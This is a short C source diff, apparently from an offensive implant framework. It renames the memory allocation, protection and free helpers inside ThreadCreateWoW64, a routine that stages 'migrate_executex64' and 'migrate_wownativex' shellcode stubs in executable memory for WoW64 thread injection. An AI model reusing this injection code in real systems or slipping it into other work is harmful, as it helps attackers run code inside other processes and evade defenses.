@@ -164,7 +164,7 @@ HANDLE ThreadCreateWoW64(
 
     // allocate some memory for both shellcode stubs
     Size = sizeof( migrate_executex64 ) + sizeof(migrate_wownativex);
-    if ( ! ( pExecuteX64 = MemoryAlloc( DX_MEM_DEFAULT, NtCurrentProcess(), Size, PAGE_READWRITE ) ) ) {
+    if ( ! ( pExecuteX64 = MmVirtualAlloc( DX_MEM_DEFAULT, NtCurrentProcess(), Size, PAGE_READWRITE ) ) ) {
         PUTS( "Failed allocating RW for migrate_executex64 and migrate_wownativex" )
         goto END;
     }
@@ -177,7 +177,7 @@ HANDLE ThreadCreateWoW64(
     MemCopy( pX64function, &migrate_wownativex, sizeof( migrate_wownativex ) );
 
     // switch RW to RX
-    if ( ! ( MemoryProtect( DX_MEM_SYSCALL, NtCurrentProcess(), pExecuteX64, Size, PAGE_EXECUTE_READ ) ) ) {
+    if ( ! ( MmVirtualProtect( DX_MEM_SYSCALL, NtCurrentProcess(), pExecuteX64, Size, PAGE_EXECUTE_READ ) ) ) {
         PUTS( "Failed to change memory protection" )
         goto END;
     }
@@ -206,7 +206,7 @@ HANDLE ThreadCreateWoW64(
 
 END:
     if ( pExecuteX64 ) {
-        MemoryFree( NtCurrentProcess(), pExecuteX64 );
+        MmVirtualFree( NtCurrentProcess(), pExecuteX64 );
     }
 
     return hThread;
